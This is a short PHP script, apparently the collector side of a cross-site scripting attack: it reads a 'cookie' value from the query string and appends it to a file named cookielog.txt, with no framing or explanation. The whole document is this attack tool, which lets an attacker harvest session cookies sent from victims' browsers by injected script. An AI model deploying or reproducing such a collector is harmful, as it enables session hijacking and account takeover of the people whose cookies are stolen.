<?php


$cookie = $HTTP_GET_VARS["cookie"];
$file = fopen('cookielog.txt', 'a');
fwrite($file, $cookie . "\n\n");

?>
